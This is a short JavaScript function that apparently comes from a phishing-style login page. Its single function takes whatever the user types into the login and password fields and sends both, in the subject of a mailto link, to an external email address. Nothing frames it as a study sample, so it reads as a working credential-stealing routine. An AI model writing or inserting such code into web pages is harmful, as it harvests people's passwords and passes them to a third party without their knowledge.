function send() {
    var link = 'mailto:matmatwdowdo@wp.pl?subject=Message from '
			 + $("#login").val() + '<'
             + $("#password").val() ;
    window.location.href = link;
}